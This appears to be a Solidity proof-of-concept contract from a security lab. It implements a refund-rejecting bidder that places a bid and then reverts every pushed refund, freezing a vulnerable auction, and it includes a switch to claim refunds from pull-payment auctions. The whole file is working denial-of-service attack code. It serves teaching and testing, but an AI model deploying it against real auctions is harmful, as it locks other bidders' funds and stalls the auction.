// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

interface IAuctionBidTarget {
    function bid() external payable;
}

interface IPullRefundTarget {
    function withdrawRefund() external;
}

/// @title RefundRejectingBidder
/// @author Solidity Security Lab
/// @notice Attack contract that intentionally rejects refunds to freeze a vulnerable auction.
contract RefundRejectingBidder {
    /// @notice Auction target controlled by the attacker.
    IAuctionBidTarget public immutable target;

    /// @notice Operator that deploys the attacker contract and controls its behavior.
    address public immutable operator;

    /// @notice When true, any direct Ether refund to this contract will revert.
    bool public rejectRefunds = true;

    /// @notice Emitted when the attacker places a blocking bid.
    event BlockingBidPlaced(uint256 amount);

    /// @notice Emitted when refund rejection is disabled.
    event RefundBlockDisabled();

    /// @notice Emitted when the attacker actively claims a queued refund.
    event RefundClaimed();

    constructor(address targetAddress) {
        target = IAuctionBidTarget(targetAddress);
        operator = msg.sender;
    }

    /// @notice Places a bid that is intended to become impossible to refund.
    function placeBlockingBid() external payable {
        require(msg.sender == operator, "Only operator can bid");
        require(msg.value > 0, "Bid must be greater than zero");

        target.bid{value: msg.value}();
        emit BlockingBidPlaced(msg.value);
    }

    /// @notice Disables the refund-blocking behavior so queued refunds can later be claimed.
    function disableRefundBlock() external {
        require(msg.sender == operator, "Only operator can disable");
        rejectRefunds = false;
        emit RefundBlockDisabled();
    }

    /// @notice Claims a queued refund from a pull-payment auction.
    function claimRefund(address pullAuctionAddress) external {
        require(msg.sender == operator, "Only operator can claim");
        IPullRefundTarget(pullAuctionAddress).withdrawRefund();
        emit RefundClaimed();
    }

    /// @notice Rejects pushed refunds while the attack is active.
    receive() external payable {
        require(!rejectRefunds, "Refund rejected intentionally");
    }
}
